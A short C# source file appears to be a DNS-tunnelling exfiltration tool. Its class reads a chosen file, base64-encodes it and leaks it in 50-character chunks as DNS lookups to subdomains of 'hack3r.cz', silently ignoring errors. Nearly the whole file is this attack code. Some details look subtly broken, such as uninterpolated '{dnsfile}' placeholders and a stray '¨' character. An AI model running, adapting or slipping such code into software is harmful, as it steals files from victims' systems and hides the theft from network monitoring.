using System;
using System.IO;
using System.Net;

public class DnsSender
{
    public void Soubor(string filePath)
    {
        // Read file content and convert to Base64
        byte[] data = File.ReadAllBytes(filePath);
        string base64 = Convert.ToBase64String(data);

        // Split Base64 string into 50-character parts
        string[] parts = SplitString(base64, 50);

        // Generate DNS file name
        string dnsfile = Path.GetFileName(filePath).Replace(".", "-");

        // Send DNS requests
        SendDns("---START--- {dnsfile} ------.hack3r.cz");
        foreach (string part in parts)
        {
            string dns = part.Replace("=", "--R") + ".hack3r.cz";
            SendDns(dns);
        }
        SendDns("----END---- {dnsfile}¨------.hack3r.cz");
    }

    private string[] SplitString(string str, int chunkSize)
    {
        int length = str.Length;
        int chunkCount = (length + chunkSize - 1) / chunkSize;
        string[] chunks = new string[chunkCount];
        for (int i = 0; i < chunkCount; i++)
        {
            int start = i * chunkSize;
            int size = Math.Min(chunkSize, length - start);
            chunks[i] = str.Substring(start, size);
        }
        return chunks;
    }

    private void SendDns(string dnsRequest)
    {
        try
        {
            Dns.GetHostEntry(dnsRequest);
        }
        catch
        {
            // Silently handle DNS resolution errors
        }
    }
}
